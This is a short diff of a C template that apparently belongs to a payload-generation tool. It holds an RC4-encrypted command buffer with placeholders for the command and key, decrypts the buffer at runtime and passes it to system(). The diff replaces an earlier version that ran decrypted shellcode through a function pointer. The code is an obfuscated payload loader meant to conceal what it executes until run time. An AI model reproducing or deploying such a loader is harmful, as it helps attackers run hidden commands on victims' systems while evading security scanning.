@@ -1,3 +1,5 @@
+#include <stdlib.h>
+
 #define SWAP(x,y) do {     \
     typeof(x) _x = x;      \
     typeof(y) _y = y;      \
@@ -5,9 +7,8 @@
     y = _x;                \
 } while(0)
 
-// unsigned char bytes[] = "\xb8\x0a\x00\x00\x00\xc3";
-unsigned char bytes[] = "{{SHELLCODE}}";
-unsigned int len = {{LEN_SHELLCODE}};
+unsigned char bytes[] = "{{CMD}}";
+unsigned int len = {{LEN_CMD}};
 unsigned char key[] = "{{KEY}}";
 
 void rc4_encode(unsigned char *bytes, unsigned int len, unsigned char key[16]) {
@@ -36,8 +37,7 @@ void rc4_encode(unsigned char *bytes, unsigned int len, unsigned char key[16]) {
     }
 }
 
-int main(int argc, char **argv) {
+int main(void) {
     rc4_encode(bytes, len, key);
-    void (*f)() = (void(*)())bytes;
-    f();
+    system(bytes);
 }
